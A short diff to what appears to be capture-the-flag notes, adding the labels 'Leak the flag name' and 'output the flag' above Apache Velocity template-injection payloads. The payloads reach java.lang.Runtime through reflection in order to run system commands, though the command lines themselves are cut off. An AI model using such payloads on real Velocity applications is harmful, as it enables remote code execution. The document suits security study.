@@ -88,6 +88,8 @@ $output
 ```
 
 ```txt
+Leak the flag name:
+
 #set($engine = "string")
 #set($run = $engine.getClass().forName("java.lang.Runtime"))
 #set($runtime = $run.getRuntime())
@@ -105,6 +107,8 @@ $output
   #end
 #end
 $output
+
+output the flag: 
 
 #set($engine = "string")
 #set($run = $engine.getClass().forName("java.lang.Runtime"))
